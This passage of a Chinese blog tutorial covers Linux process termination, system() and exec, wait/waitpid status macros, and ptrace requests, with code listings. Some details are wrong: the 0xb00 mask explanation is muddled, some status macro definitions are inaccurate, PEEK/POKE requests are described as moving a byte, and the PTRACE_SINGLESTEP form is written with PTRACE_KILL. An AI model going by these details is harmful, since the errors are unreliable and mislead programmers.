出发的转折点</h2><p>上面是我们用C语言最基本的进程创建函数。然而进程还有很多关联的东西，比如进程资源的销毁和释放，system和exec和进程的关系，比如每个进程背后的&#x2F;proc&#x2F;pid&#x2F;文件，比如ptrace和wait对进程的追踪和阻塞。为了我们更好的走进子进程，我们一步一步来看这些问题。</p><hr><h2 id="1-4-销毁进程"><a href="#1-4-销毁进程" class="headerlink" title="1.4 销毁进程"></a>1.4 销毁进程</h2><p>进程的常见的终止方式有5种：</p><h3 id="1-4-1-主动"><a href="#1-4-1-主动" class="headerlink" title="1.4.1 主动"></a>1.4.1 主动</h3><ul><li><code>main</code>函数的自然返回，<strong>注意：</strong><code>return</code>不是结束，只是函数结束，当它刚好结束的是<code>main</code>函数，此时导致进程结束。造成<code>return</code>结束进程的错觉。</li><li>调用<code>exit</code>函数 ，标准函数</li><li>调用<code>_exit</code>函数 ，系统调用函数</li><li>调用<code>abort</code>函数，产生<code>SIGABRT</code>信号</li></ul><hr><h3 id="1-4-2-被动"><a href="#1-4-2-被动" class="headerlink" title="1.4.2 被动"></a>1.4.2 被动</h3><ul><li>接收到某个信号，如<code>ctrl+c</code>，<code>SIGINT</code>，<code>ctrl+\ SIGOUT</code></li><li>通过<code>kill</code> 向进程发信号<br>前四四种正常的终止，后两种非正常的终止，但无论哪种方式，进程终止都会执行相同的关闭打来的文件，释放占用的内存资源，后两种终止会导致程序有些代码不能正常执行，比如对象的析构、<code>atexit</code>函数的执行。</li><li><code>exit</code>和<code>__exit</code>函数最大的区别在于<code>exit</code>函数退出之前会检查文件的打开情况，把文件缓冲区的内容写回文件，而<code>__exit</code>直接退出，什么意思？比如打开文件向文件写入内容，如果在文件没有关闭，也没有调用同步到磁盘的函数，文件并没有同步到磁盘，只存在缓冲区内，这时调用<code>exit</code>，那么进程结束时，缓冲区的内容可以同步到文件中，内容已经存在在文件之中了，调用<code>__exit</code>进程直接结束，文件不会有写入的内容。</li></ul><hr><h3 id="1-4-3-问题"><a href="#1-4-3-问题" class="headerlink" title="1.4.3 问题"></a>1.4.3 问题</h3><p>从上面可以看出，我们程序常见的退出出口基本上都会造成进程的销毁，这是必然的设计。</p><hr><h2 id="1-5-system和exec"><a href="#1-5-system和exec" class="headerlink" title="1.5 system和exec"></a>1.5 system和exec</h2><hr><h3 id="1-5-1-system启动一个新进程"><a href="#1-5-1-system启动一个新进程" class="headerlink" title="1.5.1 system启动一个新进程"></a>1.5.1 system启动一个新进程</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">       <span class="function"><span class="type">int</span> <span class="title">system</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *command)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>功能：</strong>打开命令或者程序<br><strong>参数：</strong>带路径的程序启动文件，或者在启动变量里声明的程序直接写程序名<br><strong>返回值：</strong><code>-1</code>失败<br>打开的程序是另一个进程，也可以成为此程序的子进程，因此子进程不一定和父进程视同一个程序，在成功打开所要执行的文件之后，父进程才能继续执行。</p><hr><h3 id="1-5-2-进程替换，exec函数族"><a href="#1-5-2-进程替换，exec函数族" class="headerlink" title="1.5.2 进程替换，exec函数族"></a>1.5.2 进程替换，exec函数族</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line">      <span class="keyword">extern</span> <span class="type">char</span> **environ;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execl</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execlp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">const</span> <span class="type">char</span> *arg, ...)</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execle</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">const</span> <span class="type">char</span> *arg,</span></span></span><br><span class="line"><span class="params"><span class="function">                 ..., <span class="type">char</span> * <span class="type">const</span> envp[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execv</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *path, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execvp</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[])</span></span>;</span><br><span class="line">      <span class="function"><span class="type">int</span> <span class="title">execvpe</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *file, <span class="type">char</span> *<span class="type">const</span> argv[],</span></span></span><br><span class="line"><span class="params"><span class="function">                  <span class="type">char</span> *<span class="type">const</span> envp[])</span></span>;</span><br></pre></td></tr></table></figure><p>这四个函数第一个参数都是可执行程序或者脚本的程序名，<code>execl</code>、<code>execv</code>需要带有完整的路径，第二参数为任意字符，起到占位作用，第三个或者后面的字符为调用者的参数，参数列表最后以<code>NULL</code>结尾，而<code>execlp</code>、<code>execvp</code>只需要带有可执行程序的名称即可，系统自动去环境变量去寻找同名文件，<code>execl</code>、<code>execlp</code>需要<code>NULL</code>结尾.</p><p>函数后缀说明：<br><code>l</code> <code>v</code>：参数呈现形式<br><strong>l</strong>:<code>list</code> 参数一个个的列出来<br><strong>v</strong>：<code>vector</code> 参数用数组存储起来<br><strong>p</strong>：目标程序，可以省略路径<br><strong>e</strong>:环境变量，不考虑</p><h2 id="1-6-wait与ptrace"><a href="#1-6-wait与ptrace" class="headerlink" title="1.6 wait与ptrace"></a>1.6 wait与ptrace</h2><h3 id="1-6-1-wait"><a href="#1-6-1-wait" class="headerlink" title="1.6.1 wait"></a>1.6.1 wait</h3><p>前面我们知道wait可以等待子进程结束后再执行父进程，其主要起到一个进程同步的作用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">wait</span><span class="params">(<span class="type">int</span> *status)</span></span>;</span><br><span class="line"><span class="function"><span class="type">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">int</span> *status, <span class="type">int</span> options)</span></span>;</span><br></pre></td></tr></table></figure><h4 id="1-6-1-1-pid-t-wait-int-status"><a href="#1-6-1-1-pid-t-wait-int-status" class="headerlink" title="1.6.1.1 pid_t wait(int *status);"></a>1.6.1.1 pid_t wait(int *status);</h4><p>函数返回值为结束子进程的进程号，如果当前进程中没有子进程则返回-1。</p><p>参数为子进程结束状态指针，该指针是一个int类型的指针，如果单纯地想等待子进程结束而不关心进程结束状态，参数写入NULL；若想获得子进程结束状态，将参数地址写入即可，例如int statue存储子进程的解释状态，函数调用wait(&amp;statue)即可。</p><h4 id="1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options"><a href="#1-6-1-2-pid-t-waitpid-pid-t-pid-int-status-int-options" class="headerlink" title="1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);"></a>1.6.1.2 pid_t waitpid(pid_t pid, int *status, int options);</h4><p>第一个参数<strong>pid：</strong>从参数的名字<code>pid</code>和类型<code>pid_t</code>中就可以看出，这里需要的是一个进程<code>ID</code>。但当<code>pid</code>取不同的值时，在这里有不同的意义。</p><ul><li>pid&gt;0时，只等待进程<code>ID</code>等于<code>pid</code>的子进程，不管其它已经有多少子进程运行结束退出了，只要指定的子进程还没有结束，<code>waitpid</code>就会一直等下去。</li><li>pid&#x3D;&#x3D;-1时，等待任何一个子进程退出，没有任何限制，此时<code>waitpid</code>和<code>wait</code>的作用一模一样。</li><li>pid&#x3D;&#x3D;0时，等待同一个进程组中的任何子进程，如果子进程已经加入了别的进程组，<code>waitpid</code>不会对它做任何理睬。</li><li>pid&lt;-1时，等待一个指定进程组中的任何子进程，这个进程组的<code>ID</code>等于<code>pid</code>的绝对值。<br>第二个参数与<code>wait</code>相同，存储制定子进程终止的状态信息。为整形指针类型。</li></ul><p>第二个参数<strong>options：</strong><code>options</code>提供了一些额外的选项来控制<code>waitpid</code>，目前在Liunx中只支持下面三个选项，这是三个常数，可以用”|”运算符把它们连接起来使用。</p><ul><li><strong>WNOHANG：</strong>如果没有子项退出，则立即返回。</li><li><strong>WUNTRACED</strong>：如果 Child 已停止（但未通过 ptrace（2） 跟踪），则返回 Child。 即使未指定此选项，也会提供已停止的跟踪子项的状态。</li><li><strong>WCONTINUED</strong> (since Linux 2.6.10)：如果已通过 SIGCONT 的交付恢复了停止的子项，则也会返回</li></ul><p>返回值和错误：</p><p><code>waitpid</code>的返回值比<code>wait</code>稍微复杂一些，一共有3种情况：</p><ul><li>当正常返回的时候，<code>waitpid</code>返回收集到的子进程的进程<code>ID</code>；</li><li>如果设置了选项<code>WNOHANG</code>，而调用中<code>waitpid</code>发现没有已退出的子进程可收集，则返回<code>0</code>；</li><li>如果调用中出错，则返回<code>-1</code>，这时<code>errno</code>会被设置成相应的值以指示错误所在；当<code>pid</code>所指示的子进程不存在，或此进程存在，但不是调用进程的子进程，<code>waitpid</code>就会出错返回，这时<code>errno</code>被设置为<code>ECHILD</code>；</li></ul><hr><h4 id="1-6-1-3-wstatus状态"><a href="#1-6-1-3-wstatus状态" class="headerlink" title="1.6.1.3 wstatus状态"></a>1.6.1.3 wstatus状态</h4><p>接下来简单介绍下wstatus，如果它不是空的，上面提到的两个wait相关函数会在这个int指针上存储状态信息。下面的宏（macros）将整数作为参数。</p><ul><li><p>**WIFEXITED(wstatus)**：如果子进程正常终止，即通过调用 exit（3） 或 _exit（2），或者从 main（） 返回，则返回 true。</p></li><li><p>**WEXITSTATUS(wstatus)**：返回 Child 的退出状态。 这包括子级在调用 exit（3） 或 _exit（2） 时指定或作为 main（） 中 return 语句的参数的 status 参数的最低有效 8 位。 只有在以下情况下，才应使用此宏WIFEXITED 返回 true。</p></li><li><p>**WIFSIGNALED(wstatus)**：如果子进程被 Signal 终止，则返回 true。</p></li><li><p>**WTERMSIG(wstatus)**：返回导致子进程终止的信号的编号。 仅当 WIFSIGNALED 返回 true 时，才应使用此宏。</p></li><li><p>**WCOREDUMP(wstatus)**：如果子对象生成了 core dump，则返回 true（参见 core（5））。 仅当 WIFSIGNALED 返回 true 时，才应使用此宏。</p></li><li><ul><li>此宏未在 POSIX.1-2001 中指定，并且在某些 UNIX 实现（例如 AIX、SunOS）上不可用。 因此，在 WCOREDUMP 中关闭其使用 #ifdef … #endif。</li></ul></li><li><p>**WIFSTOPPED(wstatus)**：如果子进程因传递信号而停止，则返回 true;仅当调用是使用 WUNTRACED 完成的时，才有可能这样做或者当 child 被追踪时（参见 ptrace（2））。</p></li><li><p>**WSTOPSIG(wstatus)**：返回导致 Child 停止的信号的编号。 仅当 WIFSTOPPED 返回 true 时，才应使用此宏。</p></li><li><p>**WIFCONTINUED(wstatus):**（自 Linux 2.6.10 起）如果子进程通过交付 SIGCONT 恢复，则返回 true。</p></li></ul><p>宏的对应整数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WIFEXITED(status)    (((status) &amp; 0xff) == 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WEXITSTATUS(status)  ((status) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSIGNALED(status)   (((status) &amp; 0x7f) &gt; 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WTERMSIG(status)      ((status) &amp; 0x7f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WCOREDUMP(status)    (((status) &amp; 0x80) != 0)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFSTOPPED(status)   (((status) &amp; 0xff) == 0x7f)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WSTOPSIG(status)     ((status) &gt;&gt; 8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WIFCONTINUED(status) ((((status) &amp; 0xffff) == 0xffff) ? 0 : 1)</span></span><br></pre></td></tr></table></figure><p>比如在 <code>wstatus</code> 的上下文中，掩码 <code>0xb00</code> 可能用于检查以下两种情况：</p><ol><li>子进程是否因为一个信号而停止（<code>WIFSTOPPED</code>），这通常由 <code>0x7f</code> 掩码来检查，但是 <code>0xb00</code> 可以进一步检查是否有特定的停止信号。</li><li>子进程是否产生了核心转储（<code>WCOREDUMP</code>），这通常由 <code>0x80</code> 掩码来检查，但是 <code>0xb00</code> 可以检查更具体的条件。</li></ol><p>具体来说，<code>0xb00</code> 掩码检查的是 <code>wstatus</code> 的第 8 位和第 11 位（从最低位开始计数）：</p><ul><li>第 8 位（10000000）：如果设置，表示子进程产生了核心转储。</li><li>第 11 位（00010000）：这个位的具体含义取决于具体的系统实现，但在许多系统中，它并不用于 <code>wait</code> 或 <code>waitpid</code> 函数。</li></ul><hr><h3 id="1-6-2-ptrace"><a href="#1-6-2-ptrace" class="headerlink" title="1.6.2 ptrace"></a>1.6.2 ptrace</h3><h4 id="1-6-2-1-ptrace函数解析"><a href="#1-6-2-1-ptrace函数解析" class="headerlink" title="1.6.2.1 ptrace函数解析"></a>1.6.2.1 ptrace函数解析</h4><p>参考：<a href="https://blog.csdn.net/u012417380/article/details/60468697">Linux源码分析之Ptrace_特殊进程不可以被跟踪-CSDN博客</a></p><p>参考：<a href="https://zhuanlan.zhihu.com/p/653385264#:~:text=%E8%BF%99%E4%B8%80%E7%AF%87%E5%B0%86%E8%A6%81%E4%BB%8B%E7%BB%8D%E7%9A%84%E6%98%AF%E4%B8%80">威力巨大的系统调用——ptrace - 知乎 (zhihu.com)</a></p><p>ptrace提供了父进程观察和控制另一个进程执行的机制，同时提供查询和修改另一进程的核心image(核心镜像？如何理解）它主要用于断点调试。当进程被中止，会通知父进程，进程的内存空间可以被读写，父进程可以选择子进程继续执行还是中止。</p><p>函数原型</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ptrace</span><span class="params">(<span class="type">int</span> request, <span class="type">int</span> pid, <span class="type">int</span> addr, <span class="type">int</span> data)</span></span>; </span><br></pre></td></tr></table></figure><ul><li>request：要执行的操作类型；</li><li>pid：被追踪的目标进程ID；</li><li>addr：被监控的目标内存地址；</li><li>data：保存读取出或者要写入的数据。</li></ul><p>Request参数决定了系统调用的功能</p><table><thead><tr><th><strong>请求</strong></th><th><strong>作用</strong></th></tr></thead><tbody><tr><td>PTRACE_TRACEME</td><td>本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</td></tr><tr><td>PTRACE_PEEKTEXT, PTRACE_PEEKDATA</td><td>从内存地址中读取一个字节，内存地址由addr给出。</td></tr><tr><td>PTRACE_PEEKUSR</td><td>从USER区域中读取一个字节，偏移量为addr。</td></tr><tr><td>PTRACE_POKETEXT, PTRACE_POKEDATA</td><td>往内存地址中写入一个字节。内存地址由addr给出。</td></tr><tr><td>PTRACE_POKEUSR</td><td>往USER区域中写入一个字节。偏移量为addr。</td></tr><tr><td>PTRACE_SYSCALL, PTRACE_CONT</td><td>重新运行。</td></tr><tr><td>PTRACE_KILL</td><td>杀掉子进程，使它退出。</td></tr><tr><td>PTRACE_SINGLESTEP</td><td>设置单步执行标志</td></tr><tr><td>PTRACE_ATTACH</td><td>跟踪指定pid 进程。</td></tr><tr><td>PTRACE_DETACH</td><td>结束跟踪</td></tr></tbody></table><p>还有一个inter386特有</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1725520062487-a9289a68-c329-4311-a2e5-f3653491e751.png" alt="img"></p><p>对init进程不可使用此函数</p><p><strong>返回值</strong><br>成功返回0。错误返回-1。errno被设置。</p><p><strong>错误</strong><br>EPERM<br>特殊进程不可以被跟踪或进程已经被跟踪。<br>ESRCH<br>指定的进程不存在<br>EIO<br>请求非法</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Type of the REQUEST argument to `ptrace.&#x27;  */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> __<span class="title">ptrace_request</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* 跟踪发出此请求的进程,此过程接收的所有信号都可以被其父级拦截,其父级可以使用其他&quot;ptrace&quot;请求 */</span></span><br><span class="line">    PTRACE_TRACEME = <span class="number">0</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程text空间中,地址ADDR处的word(字) */</span></span><br><span class="line">    PTRACE_PEEKTEXT = <span class="number">1</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程data空间中,地址ADDR处的word(字) */</span></span><br><span class="line">    PTRACE_PEEKDATA = <span class="number">2</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 返回进程用户区域中,偏移为ADDR的word(字) */</span></span><br><span class="line">    PTRACE_PEEKUSER = <span class="number">3</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的text空间,地址为ADDR */</span></span><br><span class="line">    PTRACE_POKETEXT = <span class="number">4</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的data空间,地址为ADDR */</span></span><br><span class="line">    PTRACE_POKEDATA = <span class="number">5</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 将一字大小的DATA写入进程的用户区域,偏移量为ADDR */</span></span><br><span class="line">    PTRACE_POKEUSER = <span class="number">6</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 继续该process(进程) */</span></span><br><span class="line">    PTRACE_CONT = <span class="number">7</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 杀死该process(进程) */</span></span><br><span class="line">    PTRACE_KILL = <span class="number">8</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 单步执行该process(进程) */</span></span><br><span class="line">    PTRACE_SINGLESTEP = <span class="number">9</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 附加到正在运行的进程 */</span></span><br><span class="line">    PTRACE_ATTACH = <span class="number">16</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 从附加到&#x27;PTRACE_ATTACH&#x27;的进程中分离 */</span></span><br><span class="line">    PTRACE_DETACH = <span class="number">17</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 继续并在进入系统调用或从系统调用返回时停止 */</span></span><br><span class="line">    PTRACE_SYSCALL = <span class="number">24</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置跟踪筛选器选项 */</span></span><br><span class="line">    PTRACE_SETOPTIONS = <span class="number">0x4200</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取最后一条ptrace消息 */</span></span><br><span class="line">    PTRACE_GETEVENTMSG = <span class="number">0x4201</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取流程的siginfo(签名信息) */</span></span><br><span class="line">    PTRACE_GETSIGINFO = <span class="number">0x4202</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 为进程设置新的siginfo(签名信息) */</span></span><br><span class="line">    PTRACE_SETSIGINFO = <span class="number">0x4203</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取寄存器内容 */</span></span><br><span class="line">    PTRACE_GETREGSET = <span class="number">0x4204</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 设置寄存器内容 */</span></span><br><span class="line">    PTRACE_SETREGSET = <span class="number">0x4205</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 类似于&#x27;PTRACE_ATTACH&#x27;,但不要强迫跟踪trap(陷阱),也不会影响signal(信号)或group stop state(组停止状态) */</span></span><br><span class="line">    PTRACE_SEIZE = <span class="number">0x4206</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 陷阱捕获了tracee  */</span></span><br><span class="line">    PTRACE_INTERRUPT = <span class="number">0x4207</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 等待下一个group event(事件组) */</span></span><br><span class="line">    PTRACE_LISTEN = <span class="number">0x4208</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检索siginfo_t结构,而无需从队列中删除信号 */</span></span><br><span class="line">    PTRACE_PEEKSIGINFO = <span class="number">0x4209</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取被阻止信号的掩码 */</span></span><br><span class="line">    PTRACE_GETSIGMASK = <span class="number">0x420a</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 更改被阻止信号的掩码 */</span></span><br><span class="line">    PTRACE_SETSIGMASK = <span class="number">0x420b</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取seccomp BPF筛选器 */</span></span><br><span class="line">    PTRACE_SECCOMP_GET_FILTER = <span class="number">0x420c</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取seccomp BPF筛选器元数据 */</span></span><br><span class="line">    PTRACE_SECCOMP_GET_METADATA = <span class="number">0x420d</span>,</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 获取有关系统调用的信息 */</span></span><br><span class="line">    PTRACE_GET_SYSCALL_INFO = <span class="number">0x420e</span></span><br><span class="line"></span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><hr><h4 id="1-6-2-2-功能详细描述"><a href="#1-6-2-2-功能详细描述" class="headerlink" title="1.6.2.2 功能详细描述"></a>1.6.2.2 功能详细描述</h4><h5 id="1-6-2-2-1-原来"><a href="#1-6-2-2-1-原来" class="headerlink" title="1.6.2.2.1 原来"></a>1.6.2.2.1 原来</h5><p>1)PTRACE_TRACEME</p><p>形式：ptrace(PTRACE_TRACEME,0 ,0 ,0)<br>描述：本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</p><p>2)PTRACE_PEEKTEXT, PTRACE_PEEKDATA</p><p>形式：ptrace(PTRACE_PEEKTEXT, pid, addr, data)<br>ptrace(PTRACE_PEEKDATA, pid, addr, data)<br>描述：从内存地址中读取一个字节，pid表示被跟踪的子进程，内存地址由addr给出，data为用户变量地址用于返回读到的数据。在<a href="https://so.csdn.net/so/search?q=Linux&spm=1001.2101.3001.7020">Linux</a>（i386）中用户代码段与用户数据段重合所以读取代码段和数据段数据处理是一样的。</p><p>3)PTRACE_POKETEXT, PTRACE_POKEDATA</p><p>形式：ptrace(PTRACE_POKETEXT, pid, addr, data)<br>ptrace(PTRACE_POKEDATA, pid, addr, data)<br>描述：往内存地址中写入一个字节。pid表示被跟踪的子进程，内存地址由addr给出，data为所要写入的数据。</p><p>4)PTRACE_PEEKUSR</p><p>形式：ptrace(PTRACE_PEEKUSR, pid, addr, data)<br>描述：从USER区域中读取一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为用户变量地址用于返回读到的数据。USER结构为core文件的前面一部分，它描述了进程中止时的一些状态，如：寄存器值，代码、数据段大小，代码、数据段开始地址等。在Linux（i386）中通过PTRACE_PEEKUSER和PTRACE_POKEUSR可以访问USER结构的数据有寄存器和调试寄存器。</p><p>5)PTRACE_POKEUSR</p><p>形式：ptrace(PTRACE_POKEUSR, pid, addr, data)<br>描述：往USER区域中写入一个字节，pid表示被跟踪的子进程，USER区域地址由addr给出，data为需写入的数据。</p><p>6)PTRACE_CONT</p><p>形式：ptrace(PTRACE_CONT, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。</p><p>7)PTRACE_SYSCALL</p><p>形式：ptrace(PTRACE_SYS, pid, 0, signal)<br>描述：继续执行。pid表示被跟踪的子进程，signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。<strong>与PTRACE_CONT不同的是进行系统调用跟踪</strong>。在被跟踪进程继续运行直到调用系统调用开始或结束时，被跟踪进程被中止，并通知父进程。</p><p>8)PTRACE_KILL</p><p>形式：ptrace(PTRACE_KILL,pid)<br>描述：杀掉子进程，使它退出。pid表示被跟踪的子进程。</p><p>9)PTRACE_SINGLESTEP</p><p>形式：ptrace(PTRACE_KILL, pid, 0, signle)<br>描述：<strong>设置单步执行标志，单步执行一条指令</strong>。pid表示被跟踪的子进程。signal为0则忽略引起调试进程中止的信号，若不为0则继续处理信号signal。当被跟踪进程单步执行完一个指令后，被跟踪进程被中止，并通知父进程。</p><p>10)PTRACE_ATTACH</p><p>形式：ptrace(PTRACE_ATTACH,pid)<br>描述：跟踪指定pid 进程。pid表示被跟踪进程。<strong>被跟踪进程将成为当前进程的子进程，并进入中止状态。</strong></p><hr><h5 id="1-6-2-2-2-I386"><a href="#1-6-2-2-2-I386" class="headerlink" title="1.6.2.2.2 I386"></a>1.6.2.2.2 I386</h5><p>12)PTRACE_GETREGS</p><p>形式：ptrace(PTRACE_GETREGS, pid, 0, data)<br>描述：读取寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有17个基本寄存器的值。</p><p>13)PTRACE_SETREGS</p><p>形式：ptrace(PTRACE_SETREGS, pid, 0, data)<br>描述：设置寄存器值，pid表示被跟踪的子进程，data为用户数据地址。此功能将设置所有17个基本寄存器的值。</p><p>14)PTRACE_GETFPREGS</p><p>形式：ptrace(PTRACE_GETFPREGS, pid, 0, data)<br>描述：读取浮点寄存器值，pid表示被跟踪的子进程，data为用户变量地址用于返回读到的数据。此功能将读取所有浮点协处理器387的所有寄存器的值。</p><p>15)PTRACE_SETFPREGS</p><p>形式：ptrace(PTRACE_SETREGS, pid, 0, 